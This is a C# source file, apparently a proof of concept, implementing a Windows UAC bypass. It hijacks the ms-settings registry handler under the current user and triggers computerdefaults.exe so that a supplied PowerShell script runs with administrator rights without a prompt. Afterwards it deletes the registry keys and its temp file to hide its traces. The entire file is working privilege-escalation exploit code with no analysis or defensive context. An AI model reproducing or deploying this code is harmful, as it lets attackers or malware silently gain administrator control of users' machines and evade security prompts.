#region Imports
using System;
using Microsoft.Win32;
using System.Diagnostics;
using System.Management;
using System.Security.Principal;
using System.Windows.Forms;
using System.IO;
using System.Threading;
#endregion

namespace UAC_Bypass_POC
{
    #region uac_bypass
    public class Bypass
    {
        public static void UAC()
        {
            WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            if (!windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                Bypass.Z("Classes");
                Bypass.Z("Classes\\ms-settings");
                Bypass.Z("Classes\\ms-settings\\shell");
                Bypass.Z("Classes\\ms-settings\\shell\\open");
                RegistryKey registryKey = Bypass.Z("Classes\\ms-settings\\shell\\open\\command");
                string cpath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                registryKey.SetValue("", cpath, RegistryValueKind.String);
                registryKey.SetValue("DelegateExecute", 0, RegistryValueKind.DWord);
                registryKey.Close();
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        FileName = "cmd.exe",
                        Arguments = "/c start computerdefaults.exe"
                    });
                }
                catch { }
                Process.GetCurrentProcess().Kill();
            }
            else
            {
                RegistryKey registryKey2 = Bypass.Z("Classes\\ms-settings\\shell\\open\\command");
                registryKey2.SetValue("", "", RegistryValueKind.String);
            }
        }

        public static RegistryKey Z(string x)
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\" + x, true);
            bool flag = !Bypass.checksubkey(registryKey);
            if (flag)
            {
                registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + x);
            }
            return registryKey;
        }

        public static bool checksubkey(RegistryKey k)
        {
            bool flag = k == null;
            return !flag;
        }

        private static ManagementObject GetMngObj(string className)
        {
            ManagementClass managementClass = new ManagementClass(className);
            try
            {
                foreach (ManagementBaseObject managementBaseObject in managementClass.GetInstances())
                {
                    ManagementObject managementObject = (ManagementObject)managementBaseObject;
                    bool flag = managementObject != null;
                    if (flag)
                    {
                        return managementObject;
                    }
                }
            }
            catch { }
            return null;
        }

        public static string GetOsVer()
        {
            string result;
            try
            {
                ManagementObject mngObj = Bypass.GetMngObj("Win32_OperatingSystem");
                bool flag = mngObj == null;
                if (flag)
                {
                    result = string.Empty;
                }
                else
                {
                    result = (mngObj["Version"] as string);
                }
            }
            catch (Exception ex)
            {
                result = string.Empty;
            }
            return result;
        }
    }
    #endregion

    static class Program
    {
        #region IsAdmin?
        public static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
        #endregion

        #region Main
        static void Main(string[] args)
        {
            try
            {
                if(args.Length < 0)
                {
                    Environment.Exit(0);
                }
                else
                {
                    if (!IsAdministrator())
                    {
                        string path = Path.GetTempPath() + "noitavele.tmp";
                        string fpath = Path.GetFullPath(args[0]);

                        if (File.Exists(fpath))
                        {
                            File.WriteAllText(path, fpath);
                            Bypass.UAC();
                        }
                        else
                        {
                            Environment.Exit(0);
                        }
                    }
                    else if (IsAdministrator())
                    {
                        string path = Path.GetTempPath() + "noitavele.tmp";
                        string inputfile = File.ReadAllText(path);
                        string command = "/c powershell.exe -File " + inputfile;
                        Process.Start("cmd.exe", command);
                        RegistryKey uac_clean = Registry.CurrentUser.OpenSubKey("Software\\Classes\\ms-settings", true);
                        uac_clean.DeleteSubKeyTree("shell");
                        uac_clean.Close();
                        File.Delete(path);
                    }
                }
            }catch{}
        }
        #endregion
    }
}
